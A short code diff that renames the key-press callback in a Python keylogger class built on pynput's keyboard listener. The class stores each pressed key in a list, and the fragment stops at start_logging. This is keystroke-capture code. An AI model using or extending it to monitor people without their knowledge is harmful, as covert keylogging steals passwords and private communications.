@@ -3,9 +3,9 @@ from pynput import keyboard
 class IKeyLogger:
     def __init__(self):
         self.logged_keys = []
-        self.listener = keyboard.Listener(on_press=self.on_press)
+        self.listener = keyboard.Listener(on_press=self.press)
  
-    def on_press(self, key):
+    def press(self, key):
         self.logged_keys.append(str(key))
     def start_logging(self):
         
